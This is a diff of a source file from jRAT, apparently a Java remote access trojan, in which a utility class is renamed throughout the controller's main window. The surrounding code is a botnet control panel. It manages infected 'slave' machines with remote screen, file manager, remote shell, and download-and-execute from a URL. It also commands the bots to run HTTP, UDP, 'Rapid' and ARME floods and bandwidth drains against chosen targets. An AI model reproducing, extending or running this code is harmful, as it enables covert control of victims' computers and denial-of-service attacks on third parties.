@@ -78,7 +78,7 @@ import pro.jrat.ui.renderers.table.MainTableRenderer;
 import pro.jrat.ui.renderers.table.PluginsTableRenderer;
 import pro.jrat.utils.FlagUtils;
 import pro.jrat.utils.IconUtils;
-import pro.jrat.utils.Util;
+import pro.jrat.utils.Utils;
 
 
 @SuppressWarnings({ "serial" })
@@ -195,7 +195,7 @@ public class Frame extends BaseFrame {
 						if (sl.getThumbnail() == null) {
 							sl.addToSendQueue(new Packet40Thumbnail());
 						} else {
-							int row = Util.getRow(sl);
+							int row = Utils.getRow(sl);
 							mainModel.setValueAt(sl.getThumbnail(), row, 0);
 						}
 					}
@@ -204,7 +204,7 @@ public class Frame extends BaseFrame {
 					mainTable.setRowHeight(30);
 					for (int i = 0; i < Main.connections.size(); i++) {
 						Slave sl = Main.connections.get(i);
-						int row = Util.getRow(sl);
+						int row = Utils.getRow(sl);
 						mainModel.setValueAt(sl.getCountry(), row, 0);
 					}
 				}
@@ -401,7 +401,7 @@ public class Frame extends BaseFrame {
 		mnLook.add(mntmRowHeight);
 		mntmRowHeight.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				String str = Util.showDialog("Input", "Input new row height. Default: 30");
+				String str = Utils.showDialog("Input", "Input new row height. Default: 30");
 				if (str == null) {
 					return;
 				}
@@ -443,7 +443,7 @@ public class Frame extends BaseFrame {
 		mntmSampleMode.setIcon(new ImageIcon(Frame.class.getResource("/icons/camera.png")));
 		mntmSampleMode.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				if (Util.yesNo("Confirm", "This will break jRAT until restarted and begin a photo friendly session")) {
+				if (Utils.yesNo("Confirm", "This will break jRAT until restarted and begin a photo friendly session")) {
 					SampleMode.start();
 				}
 			}
@@ -479,7 +479,7 @@ public class Frame extends BaseFrame {
 				if (mainModel.getRowCount() == 0) {
 					return;
 				}
-				String howmany = Util.showDialog("Select X", "Select how many servers you want to select\n" + mainModel.getRowCount() + " available");
+				String howmany = Utils.showDialog("Select X", "Select how many servers you want to select\n" + mainModel.getRowCount() + " available");
 				if (howmany == null || howmany != null && howmany.length() == 0) {
 					return;
 				}
@@ -516,9 +516,9 @@ public class Frame extends BaseFrame {
 		mntmRestartAll.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				selectAll();
-				List<Slave> list = Util.getSlaves();
+				List<Slave> list = Utils.getSlaves();
 				if (list.size() > 0) {
-					if (Util.yesNo("Confirm", "Confirm restarting all servers")) {
+					if (Utils.yesNo("Confirm", "Confirm restarting all servers")) {
 						for (Slave sl : list) {
 							try {
 								sl.addToSendQueue(new Packet37RestartJavaProcess());
@@ -537,9 +537,9 @@ public class Frame extends BaseFrame {
 		mntmDisconnectAll.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				selectAll();
-				List<Slave> list = Util.getSlaves();
+				List<Slave> list = Utils.getSlaves();
 				if (list.size() > 0) {
-					if (Util.yesNo("Confirm", "Confirm disconnecting all servers")) {
+					if (Utils.yesNo("Confirm", "Confirm disconnecting all servers")) {
 						for (Slave sl : list) {
 							try {
 								sl.addToSendQueue(new Packet11Disconnect());
@@ -556,9 +556,9 @@ public class Frame extends BaseFrame {
 		mntmReconnectAll.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
 				selectAll();
-				List<Slave> list = Util.getSlaves();
+				List<Slave> list = Utils.getSlaves();
 				if (list.size() > 0) {
-					if (Util.yesNo("Confirm", "Confirm reconnecting all servers")) {
+					if (Utils.yesNo("Confirm", "Confirm reconnecting all servers")) {
 						for (Slave sl : list) {
 							try {
 								sl.addToSendQueue(new Packet45Reconnect());
@@ -579,9 +579,9 @@ public class Frame extends BaseFrame {
 		mntmUninstallAll.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				selectAll();
-				List<Slave> list = Util.getSlaves();
+				List<Slave> list = Utils.getSlaves();
 				if (list.size() > 0) {
-					if (Util.yesNo("Confirm", "Confirm uninstalling all servers")) {
+					if (Utils.yesNo("Confirm", "Confirm uninstalling all servers")) {
 						for (Slave sl : list) {
 							try {
 								sl.addToSendQueue(new Packet36Uninstall());
@@ -603,7 +603,7 @@ public class Frame extends BaseFrame {
 				if (mainModel.getRowCount() <= 0) {
 					return;
 				}
-				String result = Util.showDialog("Update from URL", "Input URL to update with");
+				String result = Utils.showDialog("Update from URL", "Input URL to update with");
 				if (result == null) {
 					return;
 				}
@@ -616,7 +616,7 @@ public class Frame extends BaseFrame {
 				
 				int servers = 0;
 				for (int i = 0; i < mainModel.getRowCount(); i++) {
-					Slave sl = Util.getSlave(mainModel.getValueAt(i, 3).toString());
+					Slave sl = Utils.getSlave(mainModel.getValueAt(i, 3).toString());
 					if (sl != null) {
 						if (!sl.getVersion().equals(Version.getVersion())) {
 							sl.addToSendQueue(new Packet18Update(result));
@@ -688,7 +688,7 @@ public class Frame extends BaseFrame {
 		mntmCache.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				FlagUtils.flags.clear();
-				Util.pingicons.clear();
+				Utils.pingicons.clear();
 				for (int i = 0; i < Main.connections.size(); i++) {
 					Slave sl = Main.connections.get(i);
 					sl.setThumbnail(null);
@@ -797,7 +797,7 @@ public class Frame extends BaseFrame {
 
 			public void popupMenuWillBecomeVisible(PopupMenuEvent arg0) {
 				try {
-					List<Slave> list = Util.getSlaves();
+					List<Slave> list = Utils.getSlaves();
 					if (list.size() == 1) {
 						JMenuItem item = new JMenuItem("Server V: " + list.get(0).getVersion());
 						JMenuItem item2 = new JMenuItem("Country: " + list.get(0).getCountry().toUpperCase());
@@ -832,7 +832,7 @@ public class Frame extends BaseFrame {
 		JMenuItem mntmControlPanel = new JMenuItem("Control Panel (1)");
 		mntmControlPanel.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				Slave slave = Util.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
+				Slave slave = Utils.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
 				if (slave != null) {
 					FrameControlPanel screen = new FrameControlPanel(slave);
 					screen.setVisible(true);
@@ -870,7 +870,7 @@ public class Frame extends BaseFrame {
 				int column = mainTable.getSelectedColumn();
 
 				if (row != -1 && column == 0) {
-					Slave sl = Util.getSlave(mainModel.getValueAt(row, 3).toString());
+					Slave sl = Utils.getSlave(mainModel.getValueAt(row, 3).toString());
 					sl.setSelected(!sl.isSelected());
 					ListSelectionModel selectionModel = mainTable.getSelectionModel();
 					selectionModel.removeSelectionInterval(row, row);
@@ -909,9 +909,9 @@ public class Frame extends BaseFrame {
 		JMenuItem mntmVisitUrl = new JMenuItem("Visit URL");
 		mntmVisitUrl.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				List<Slave> servers = Util.getSlaves();
+				List<Slave> servers = Utils.getSlaves();
 				if (servers.size() > 0) {
-					String result = Util.showDialog("Visit URL", "Input URL to visit");
+					String result = Utils.showDialog("Visit URL", "Input URL to visit");
 					if (result != null && !result.startsWith("http://")) {
 						result = "http://" + result;
 					}
@@ -943,7 +943,7 @@ public class Frame extends BaseFrame {
 		JMenuItem mntmRemoteScreen = new JMenuItem("Remote Screen");
 		mntmRemoteScreen.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
-				Slave slave = Util.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
+				Slave slave = Utils.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
 				if (slave != null) {
 					FrameRemoteScreen.show(slave);
 				}
@@ -955,7 +955,7 @@ public class Frame extends BaseFrame {
 		JMenuItem mntmFileManager = new JMenuItem("File Manager");
 		mntmFileManager.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
-				Slave slave = Util.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
+				Slave slave = Utils.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
 				if (slave != null) {
 					FrameRemoteFiles frame = new FrameRemoteFiles(slave);
 					frame.setVisible(true);
@@ -967,7 +967,7 @@ public class Frame extends BaseFrame {
 		mntmQuickRemoteScreen.setIcon(new ImageIcon(Frame.class.getResource("/icons/quick_remote_desktop.png")));
 		mntmQuickRemoteScreen.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				Slave slave = Util.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
+				Slave slave = Utils.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
 				if (slave != null) {
 					FrameQuickRemoteScreen frame = new FrameQuickRemoteScreen(slave);
 					frame.setVisible(true);
@@ -981,7 +981,7 @@ public class Frame extends BaseFrame {
 		JMenuItem mntmRemoteCmd = new JMenuItem("Remote CMD");
 		mntmRemoteCmd.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
-				Slave slave = Util.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
+				Slave slave = Utils.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
 				if (slave != null) {
 					FrameRemoteShell frame = new FrameRemoteShell(slave);
 					frame.setVisible(true);
@@ -994,7 +994,7 @@ public class Frame extends BaseFrame {
 		JMenuItem mntmRemoteChat = new JMenuItem("Remote Chat");
 		mntmRemoteChat.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				Slave slave = Util.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
+				Slave slave = Utils.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
 				if (slave != null) {
 					FrameRemoteChat frame = new FrameRemoteChat(slave);
 					frame.setVisible(true);
@@ -1005,7 +1005,7 @@ public class Frame extends BaseFrame {
 		JMenuItem mntmRemoteProcess = new JMenuItem("Remote Process");
 		mntmRemoteProcess.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
-				Slave slave = Util.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
+				Slave slave = Utils.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
 				if (slave != null) {
 					FrameRemoteProcess frame = new FrameRemoteProcess(slave);
 					frame.setVisible(true);
@@ -1021,7 +1021,7 @@ public class Frame extends BaseFrame {
 		mntmNotes.setIcon(new ImageIcon(Frame.class.getResource("/icons/sticky-notes-pin.png")));
 		mntmNotes.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				Slave slave = Util.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
+				Slave slave = Utils.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
 				if (slave != null) {
 					FrameNotes frame = new FrameNotes(slave);
 					frame.setVisible(true);
@@ -1034,9 +1034,9 @@ public class Frame extends BaseFrame {
 		JMenuItem mntmRunCommand = new JMenuItem("Run Command");
 		mntmRunCommand.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				List<Slave> servers = Util.getSlaves();
+				List<Slave> servers = Utils.getSlaves();
 				if (servers.size() > 0) {
-					String process = Util.showDialog("Run Command", "Select command to send to servers");
+					String process = Utils.showDialog("Run Command", "Select command to send to servers");
 					if (process == null) {
 						return;
 					}
@@ -1054,9 +1054,9 @@ public class Frame extends BaseFrame {
 		mntmUpdateFromUrl.setIcon(new ImageIcon(Frame.class.getResource("/icons/update.png")));
 		mntmUpdateFromUrl.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				List<Slave> servers = Util.getSlaves();
+				List<Slave> servers = Utils.getSlaves();
 				if (servers.size() > 0) {
-					String result = Util.showDialog("Update from URL", "Input URL to update with");
+					String result = Utils.showDialog("Update from URL", "Input URL to update with");
 					if (result == null) {
 						return;
 					}
@@ -1081,9 +1081,9 @@ public class Frame extends BaseFrame {
 		mntmexe.setIcon(new ImageIcon(Frame.class.getResource("/icons/down_arrow.png")));
 		mntmexe.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				List<Slave> servers = Util.getSlaves();
+				List<Slave> servers = Utils.getSlaves();
 				if (servers.size() > 0) {
-					String result = Util.showDialog("Download and Execute", "Input URL to download and execute");
+					String result = Utils.showDialog("Download and Execute", "Input URL to download and execute");
 					if (result == null) {
 						return;
 					}
@@ -1112,11 +1112,11 @@ public class Frame extends BaseFrame {
 		JMenuItem mntmHttpFlood = new JMenuItem("HTTP GET flood");
 		mntmHttpFlood.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				String target = Util.showDialog("HTTP GET flood", "Enter URL to flood");
+				String target = Utils.showDialog("HTTP GET flood", "Enter URL to flood");
 				if (target == null) {
 					return;
 				}
-				String time = Util.showDialog("HTTP GET flood", "Enter seconds to flood");
+				String time = Utils.showDialog("HTTP GET flood", "Enter seconds to flood");
 				if (time == null) {
 					return;
 				}
@@ -1126,7 +1126,7 @@ public class Frame extends BaseFrame {
 				} catch (Exception ex) {
 					return;
 				}
-				List<Slave> servers = Util.getSlaves();
+				List<Slave> servers = Utils.getSlaves();
 				if (servers.size() > 0) {
 					for (Slave sl : servers) {
 						sl.addToSendQueue(new Packet22Flood(Flood.GET, target, time1));
@@ -1140,7 +1140,7 @@ public class Frame extends BaseFrame {
 		JMenuItem mntmUdpFlood = new JMenuItem("UDP flood");
 		mntmUdpFlood.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				String target = Util.showDialog("UDP flood", "Enter IP:Port to flood");
+				String target = Utils.showDialog("UDP flood", "Enter IP:Port to flood");
 				if (target == null) {
 					return;
 				}
@@ -1151,7 +1151,7 @@ public class Frame extends BaseFrame {
 					JOptionPane.showMessageDialog(null, "Enter valid IP:Port!", "Error", JOptionPane.ERROR_MESSAGE);
 					return;
 				}
-				String time = Util.showDialog("UDP flood", "Enter seconds to flood");
+				String time = Utils.showDialog("UDP flood", "Enter seconds to flood");
 				if (time == null) {
 					return;
 				}
@@ -1162,7 +1162,7 @@ public class Frame extends BaseFrame {
 					JOptionPane.showMessageDialog(null, "Enter valid seconds as number!", "Error", JOptionPane.ERROR_MESSAGE);
 					return;
 				}
-				List<Slave> servers = Util.getSlaves();
+				List<Slave> servers = Utils.getSlaves();
 				if (servers.size() > 0) {
 					for (Slave sl : servers) {
 						sl.addToSendQueue(new Packet22Flood(Flood.UDP, target, time1));
@@ -1174,11 +1174,11 @@ public class Frame extends BaseFrame {
 		JMenuItem mntmHttpPostFlood = new JMenuItem("HTTP Post flood");
 		mntmHttpPostFlood.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				String target = Util.showDialog("HTTP Post flood", "Enter URL to flood");
+				String target = Utils.showDialog("HTTP Post flood", "Enter URL to flood");
 				if (target == null) {
 					return;
 				}
-				String time = Util.showDialog("HTTP Post flood", "Enter seconds to flood");
+				String time = Utils.showDialog("HTTP Post flood", "Enter seconds to flood");
 				if (time == null) {
 					return;
 				}
@@ -1189,7 +1189,7 @@ public class Frame extends BaseFrame {
 					JOptionPane.showMessageDialog(null, "Enter valid seconds as number!", "Error", JOptionPane.ERROR_MESSAGE);
 					return;
 				}
-				List<Slave> servers = Util.getSlaves();
+				List<Slave> servers = Utils.getSlaves();
 				if (servers.size() > 0) {
 					for (Slave sl : servers) {
 						sl.addToSendQueue(new Packet22Flood(Flood.POST, target, time1));
@@ -1204,11 +1204,11 @@ public class Frame extends BaseFrame {
 		mntmHttpHeadFlood.setIcon(new ImageIcon(Frame.class.getResource("/icons/wallet.png")));
 		mntmHttpHeadFlood.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				String target = Util.showDialog("HTTP Head flood", "Enter URL to flood");
+				String target = Utils.showDialog("HTTP Head flood", "Enter URL to flood");
 				if (target == null) {
 					return;
 				}
-				String time = Util.showDialog("HTTP Head flood", "Enter seconds to flood");
+				String time = Utils.showDialog("HTTP Head flood", "Enter seconds to flood");
 				if (time == null) {
 					return;
 				}
@@ -1219,7 +1219,7 @@ public class Frame extends BaseFrame {
 					JOptionPane.showMessageDialog(null, "Enter valid seconds as number!", "Error", JOptionPane.ERROR_MESSAGE);
 					return;
 				}
-				List<Slave> servers = Util.getSlaves();
+				List<Slave> servers = Utils.getSlaves();
 				if (servers.size() > 0) {
 					for (Slave sl : servers) {
 						sl.addToSendQueue(new Packet22Flood(Flood.HEAD, target, time1));
@@ -1234,12 +1234,12 @@ public class Frame extends BaseFrame {
 		JMenuItem mntmSsynFlood = new JMenuItem("Rapid flood");
 		mntmSsynFlood.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				String target = Util.showDialog("SSYN flood", "Enter website URL to flood");
+				String target = Utils.showDialog("SSYN flood", "Enter website URL to flood");
 				if (target == null) {
 					return;
 				}
 
-				String time = Util.showDialog("SSYN flood", "Enter seconds to flood");
+				String time = Utils.showDialog("SSYN flood", "Enter seconds to flood");
 				if (time == null) {
 					return;
 				}
@@ -1250,7 +1250,7 @@ public class Frame extends BaseFrame {
 					JOptionPane.showMessageDialog(null, "Enter valid seconds as number!", "Error", JOptionPane.ERROR_MESSAGE);
 					return;
 				}
-				List<Slave> servers = Util.getSlaves();
+				List<Slave> servers = Utils.getSlaves();
 				if (servers.size() > 0) {
 					for (Slave sl : servers) {
 						sl.addToSendQueue(new Packet22Flood(Flood.RAPID, target, time1));
@@ -1264,11 +1264,11 @@ public class Frame extends BaseFrame {
 		JMenuItem mntmBandwidthDrain = new JMenuItem("Bandwidth drain");
 		mntmBandwidthDrain.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				String target = Util.showDialog("Bandwidth drain", "Enter URL to mass download");
+				String target = Utils.showDialog("Bandwidth drain", "Enter URL to mass download");
 				if (target == null) {
 					return;
 				}
-				String time = Util.showDialog("Bandwidth drain", "Enter seconds to drain");
+				String time = Utils.showDialog("Bandwidth drain", "Enter seconds to drain");
 				if (time == null) {
 					return;
 				}
@@ -1279,7 +1279,7 @@ public class Frame extends BaseFrame {
 					JOptionPane.showMessageDialog(null, "Enter valid seconds as number!", "Error", JOptionPane.ERROR_MESSAGE);
 					return;
 				}
-				List<Slave> servers = Util.getSlaves();
+				List<Slave> servers = Utils.getSlaves();
 				if (servers.size() > 0) {
 					for (Slave sl : servers) {
 						sl.addToSendQueue(new Packet22Flood(Flood.DRAIN, target, time1));
@@ -1293,7 +1293,7 @@ public class Frame extends BaseFrame {
 		JMenuItem mntmArme = new JMenuItem("ARME");
 		mntmArme.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				String target = Util.showDialog("ARME flood", "Enter Host:Port/IP:Port to flood");
+				String target = Utils.showDialog("ARME flood", "Enter Host:Port/IP:Port to flood");
 				if (target == null) {
 					return;
 				}
@@ -1304,7 +1304,7 @@ public class Frame extends BaseFrame {
 					JOptionPane.showMessageDialog(null, "Enter valid IP:Port!", "Error", JOptionPane.ERROR_MESSAGE);
 					return;
 				}
-				String time = Util.showDialog("ARME flood", "Enter seconds to flood");
+				String time = Utils.showDialog("ARME flood", "Enter seconds to flood");
 				if (time == null) {
 					return;
 				}
@@ -1315,7 +1315,7 @@ public class Frame extends BaseFrame {
 					JOptionPane.showMessageDialog(null, "Enter valid seconds as number!", "Error", JOptionPane.ERROR_MESSAGE);
 					return;
 				}
-				List<Slave> servers = Util.getSlaves();
+				List<Slave> servers = Utils.getSlaves();
 				if (servers.size() > 0) {
 					for (Slave sl : servers) {
 						sl.addToSendQueue(new Packet22Flood(Flood.ARME, target, time1));
@@ -1330,7 +1330,7 @@ public class Frame extends BaseFrame {
 		JMenuItem mntmInfo = new JMenuItem("Info");
 		mntmInfo.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				Slave slave = Util.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
+				Slave slave = Utils.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
 				if (slave != null) {
 					FrameInfo screen = new FrameInfo(slave);
 					screen.setVisible(true);
@@ -1342,7 +1342,7 @@ public class Frame extends BaseFrame {
 		mntmHost.setIcon(new ImageIcon(Frame.class.getResource("/icons/computer_info.png")));
 		mntmHost.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				Slave slave = Util.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
+				Slave slave = Utils.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
 				if (slave != null) {
 					JOptionPane.showMessageDialog(null, slave.getHost(), "Host - " + slave.getIP(), JOptionPane.INFORMATION_MESSAGE);
 				}
@@ -1355,9 +1355,9 @@ public class Frame extends BaseFrame {
 		JMenuItem mntmForceDisconnect = new JMenuItem("Disconnect");
 		mntmForceDisconnect.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				List<Slave> servers = Util.getSlaves();
+				List<Slave> servers = Utils.getSlaves();
 				if (servers.size() > 0) {
-					if (Util.yesNo("Confirm", "Confirm disconnecting " + servers.size() + " servers")) {
+					if (Utils.yesNo("Confirm", "Confirm disconnecting " + servers.size() + " servers")) {
 						for (Slave sl : servers) {
 							try {
 								sl.addToSendQueue(new Packet11Disconnect());
@@ -1373,9 +1373,9 @@ public class Frame extends BaseFrame {
 		JMenuItem mntmRestart = new JMenuItem("Restart");
 		mntmRestart.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				List<Slave> servers = Util.getSlaves();
+				List<Slave> servers = Utils.getSlaves();
 				if (servers.size() > 0) {
-					if (Util.yesNo("Confirm", "Confirm restarting " + servers.size() + " servers")) {
+					if (Utils.yesNo("Confirm", "Confirm restarting " + servers.size() + " servers")) {
 						for (Slave sl : servers) {
 							try {
 								sl.addToSendQueue(new Packet37RestartJavaProcess());
@@ -1391,7 +1391,7 @@ public class Frame extends BaseFrame {
 		JMenuItem mntmRename = new JMenuItem("Rename");
 		mntmRename.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				Slave slave = Util.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
+				Slave slave = Utils.getSlave(mainModel.getValueAt(mainTable.getSelectedRow(), 3).toString());
 				if (slave != null) {
 					FrameRename screen = new FrameRename(slave);
 					screen.setVisible(true);
@@ -1407,9 +1407,9 @@ public class Frame extends BaseFrame {
 		JMenuItem mntmRestartConnection = new JMenuItem("Reconnect");
 		mntmRestartConnection.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				List<Slave> servers = Util.getSlaves();
+				List<Slave> servers = Utils.getSlaves();
 				if (servers.size() > 0) {
-					if (Util.yesNo("Confirm", "Confirm reconnect " + servers.size() + " servers")) {
+					if (Utils.yesNo("Confirm", "Confirm reconnect " + servers.size() + " servers")) {
 						for (Slave sl : servers) {
 							try {
 								sl.addToSendQueue(new Packet45Reconnect());
@@ -1429,9 +1429,9 @@ public class Frame extends BaseFrame {
 		JMenuItem mntmUninstall = new JMenuItem("Uninstall");
 		mntmUninstall.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				List<Slave> servers = Util.getSlaves();
+				List<Slave> servers = Utils.getSlaves();
 				if (servers.size() > 0) {
-					if (Util.yesNo("Confirm", "Confirm uninstalling " + servers.size() + " servers")) {
+					if (Utils.yesNo("Confirm", "Confirm uninstalling " + servers.size() + " servers")) {
 						for (Slave sl : servers) {
 							try {
 								sl.addToSendQueue(new Packet36Uninstall());
@@ -1596,7 +1596,7 @@ public class Frame extends BaseFrame {
 					
 					item.addActionListener(new ActionListener() {
 						public void actionPerformed(ActionEvent e) {
-							List<Slave> list = Util.getSlaves();
+							List<Slave> list = Utils.getSlaves();
 							List<RATObject> servers = new ArrayList<RATObject>();
 							for (int i = 0; i < list.size(); i++) {
 								servers.add(RATObjectFormat.format(list.get(i)));
